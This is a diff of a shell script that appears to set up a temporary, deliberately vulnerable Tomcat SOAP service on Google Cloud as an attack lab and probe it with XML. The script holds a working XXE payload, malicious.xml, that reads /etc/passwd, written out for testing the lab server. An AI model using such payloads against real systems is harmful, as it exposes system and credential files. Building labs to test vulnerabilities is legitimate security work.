@@ -7,22 +7,22 @@ mkdir attack-4-tomcat
 cd attack-4-tomcat
 
 # Solution Files
-cat <<'EOF' > simple.xml
+cat <<'EOF1' > simple.xml
 <?xml version="1.0" encoding="UTF-8"?>
 <root>Hello World</root>
-EOF
+EOF1
 
-cat <<'EOF' > malicious.xml
+cat <<'EOF2' > malicious.xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ELEMENT root ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
 ]>
 <root>&xxe;</root>
-EOF
+EOF2
 
 # Create the startup script
-cat <<'EOF' > startup-script.sh
+cat <<'EOF3' > startup-script.sh
 #!/bin/bash
 sudo apt-get update
 sudo apt-get upgrade -y
@@ -105,37 +105,37 @@ sudo chown -R tomcat:tomcat /var/lib/tomcat9/webapps/ROOT
 
 # Restart Tomcat
 sudo systemctl restart tomcat9
-EOF
+EOF3
 
-# Create the instance with automatic deletion after 1 hour
-# gcloud compute instances create "attack-4-tomcat" \
-#   --zone "asia-south2-a" \
-#   --machine-type "c2-standard-4" \
-#   --image-family "ubuntu-2004-lts" \
-#   --image-project "ubuntu-os-cloud" \
-#   --boot-disk-size "10GB" \
-#   --tags "http-server,https-server,lb-health-check,attack-4-tomcat" \
-#   --metadata-from-file startup-script=attack-4-tomcat/startup-script.sh \
-#   --metadata google-compute-default-timeout=600  
-
-# Create the instance and extract the external IP
-eip=$(gcloud compute instances create "attack-4-tomcat" \
+# Create the instance with termination and auto-delete after 600 seconds
+gcloud compute instances create "attack-4-tomcat" \
   --zone "asia-south2-a" \
   --machine-type "c2-standard-4" \
   --image-family "ubuntu-2004-lts" \
   --image-project "ubuntu-os-cloud" \
   --boot-disk-size "10GB" \
   --tags "http-server,https-server,lb-health-check,attack-4-tomcat" \
-  --metadata-from-file startup-script=startup-script.sh \
+  --metadata-from-file startup-script=attack-4-tomcat/startup-script.sh \
   --metadata google-compute-default-timeout=600 \
+  --maintenance-policy=TERMINATE \
+  --provisioning-model=STANDARD \
+  --instance-termination-action=DELETE \
+  --max-run-duration=600s
+
+# Get the external IP of the created instance
+eip=$(gcloud compute instances describe "attack-4-tomcat" \
+  --zone "asia-south2-a" \
   --format="get(networkInterfaces[0].accessConfigs[0].natIP)")
 
-echo "Waiting 2.5 minutes for server to setup. Then starting testing the vulnerability."
+echo "External IP Address: $eip"
 
-sleep 150
+
+echo "Waiting 5 minutes for server to setup. Then starting testing the vulnerability."
+
+sleep 300
 
 echo "Testing with Hello World \n"
-curl -X POST -H "Content-Type: application/xml" --data @malicious.xml http://$eip/SOAPService
+curl -X POST -H "Content-Type: application/xml" --data @simple.xml http://$eip/SOAPService
 
 sleep 5
 
